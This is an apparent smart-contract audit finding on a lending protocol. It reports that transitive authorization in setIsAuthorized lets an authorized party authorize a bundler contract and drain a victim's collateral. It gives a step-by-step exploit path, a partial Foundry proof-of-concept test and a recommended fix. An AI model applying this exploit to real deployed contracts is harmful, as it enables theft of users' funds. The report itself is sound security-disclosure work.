Audit Report

## Title
Transitive Authorization Allows Authorized Party to Escalate Privileges and Drain Victim Collateral — (`src/Midnight.sol`, `src/periphery/MidnightBundles.sol`)

## Summary
`Midnight.setIsAuthorized` permits any already-authorized address to grant further authorizations on behalf of the authorizer, making the authorization system fully transitive. An attacker holding `isAuthorized[victim][attacker] = true` can authorize `MidnightBundles` on the victim's behalf, then invoke bundler functions with `taker=victim` and `collateralReceiver=attacker` to withdraw the victim's collateral to an attacker-controlled address without any additional consent from the victim.

## Finding Description

**Root cause — `setIsAuthorized` (`src/Midnight.sol:731-735`):**

The guard at line 732 allows any address that `onBehalf` has previously authorized to call this function and grant *new* authorizations on `onBehalf`'s behalf:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
``` [1](#0-0) 

There is no restriction that only the account itself (`onBehalf == msg.sender`) may issue new authorizations. This transitivity is confirmed intentional by `testSetIsAuthorizedAuthorization` (`test/AuthorizationTest.sol:290-304`), which explicitly asserts that an authorized party can set new authorizations on behalf of the authorizer:

```solidity
vm.prank(authorized);
midnight.setIsAuthorized(newAuthorized, true, user);  // succeeds after user authorized `authorized`
assertEq(midnight.isAuthorized(user, newAuthorized), true);
``` [2](#0-1) 

**Exploit path:**

**Step 1 — Precondition (legitimate):** Victim authorizes attacker for any reason:
```
midnight.setIsAuthorized(attacker, true, victim)  // called by victim
→ isAuthorized[victim][attacker] = true
```

**Step 2 — Escalation:** Attacker calls `setIsAuthorized` to authorize the bundler on victim's behalf:
```
midnight.setIsAuthorized(address(midnightBundles), true, victim)  // called by attacker
```
Check at line 732: `isAuthorized[victim][attacker]` = true → passes.
Result: `isAuthorized[victim][midnightBundles] = true`.

**Step 3 — Bundler entry:** Attacker calls `buyWithUnitsTargetAndWithdrawCollateral(..., taker=victim, collateralReceiver=attacker, ...)`. The check at `MidnightBundles.sol:60`:

```solidity
require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
``` [3](#0-2) 

`isAuthorized[victim][attacker]` = true → passes.

**Step 4 — `Midnight.take` called by bundler with `taker=victim`:** The bundler calls `IMidnight(MIDNIGHT).take(..., taker=victim, ...)` at `MidnightBundles.sol:79-85`. Midnight's internal taker authorization check: `isAuthorized[victim][midnightBundles]` = true (set in Step 2) → passes. [4](#0-3) 

**Step 5 — Collateral withdrawal to attacker:** The bundler calls `withdrawCollateral(market, ..., taker=victim, collateralReceiver=attacker)` at `MidnightBundles.sol:91-99`. Midnight checks `isAuthorized[victim][midnightBundles]` = true → passes. Victim's collateral is transferred to the attacker-controlled `collateralReceiver`. [5](#0-4) 

The `collateralReceiver` parameter is entirely caller-controlled with no restriction in `buyWithUnitsTargetAndWithdrawCollateral`.

## Impact Explanation
An attacker holding any authorization from the victim can: (1) force the victim into arbitrary debt positions by taking sell offers on the victim's behalf, (2) withdraw the victim's collateral to an attacker-controlled address, and (3) combine both to take a large debt position for the victim and then drain the victim's collateral, leaving the victim insolvent. This constitutes direct, concrete theft of user funds and violates the invariant that collateral can only be withdrawn with explicit user consent for each authorized address.

## Likelihood Explanation
The only precondition is that the victim has authorized the attacker for *any* reason — a normal and expected user action (e.g., authorizing a bot, aggregator, or third-party operator). No admin access, oracle manipulation, or leaked keys are required. The attack is repeatable: any time the victim re-authorizes the attacker, the attacker can re-authorize the bundler. The scenario is realistic because users routinely authorize operators for convenience without expecting that authorization to be transitive.

## Recommendation
Restrict `setIsAuthorized` so that only the account itself can issue new authorizations. Change the guard to require `onBehalf == msg.sender` exclusively, removing the `isAuthorized[onBehalf][msg.sender]` branch:

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender, Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
}
```

If delegation of authorization-granting is a required feature, introduce a separate, explicitly scoped permission (e.g., `canDelegate`) that is distinct from general authorization, so users can authorize operators without implicitly granting them the ability to further expand the authorization graph.

## Proof of Concept

Minimal Foundry test (extend `BaseTest`):

```solidity
function testTransitiveAuthorizationDrainsCollateral() public {
    address victim = address(0xBEEF);
    address attacker = address(0xBAD);

    // Setup: victim has collateral in the market
    deal(address(collateralToken), victim, 1000e18);
    vm.prank(victim);
    collateralToken.approve(address(midnight), type(uint256).max);
    vm.prank(victim);
    midnight.supplyCollateral(market, 0, 1000e18, victim);

    // Step 1: Victim authorizes attacker for any reason
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Step 2: Attacker escalates — authorizes MidnightBundles on victim's behalf
    vm.prank(attacker);
    midnight.setIsAuthorized(address(midnightBundles), true, victim);

    // Confirm escalation succeeded
    assertTrue(midnight.isAuthorized(victim, address(midnightBundles)));

    // Step 3-5: Attacker calls bundler with taker=victim, collateralReceiver=attacker
    // (construct minimal takes array and collateralWithdrawals targeting victim's collateral)
    // ... bundler withdraws victim's collateral to attacker
    assertGt(collateralToken.balanceOf(attacker), 0);
    assertEq(midnight.collateral(marketId, victim, 0), 0);
}
```

### Citations

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/AuthorizationTest.sol (L300-303)
```text
        vm.prank(authorized);
        midnight.setIsAuthorized(newAuthorized, true, user);

        assertEq(midnight.isAuthorized(user, newAuthorized), true);
```

**File:** src/periphery/MidnightBundles.sol (L60-60)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L79-85)
```text
            try IMidnight(MIDNIGHT)
                .take(takes[i].offer, takes[i].ratifierData, unitsToTake, taker, address(0), address(0), "") returns (
                uint256 resBuyerAssets, uint256
            ) {
                filledUnits += unitsToTake;
                filledBuyerAssets += resBuyerAssets;
            } catch {}
```

**File:** src/periphery/MidnightBundles.sol (L91-99)
```text
        for (uint256 i; i < collateralWithdrawals.length; i++) {
            IMidnight(MIDNIGHT)
                .withdrawCollateral(
                    market,
                    collateralWithdrawals[i].collateralIndex,
                    collateralWithdrawals[i].assets,
                    taker,
                    collateralReceiver
                );
```
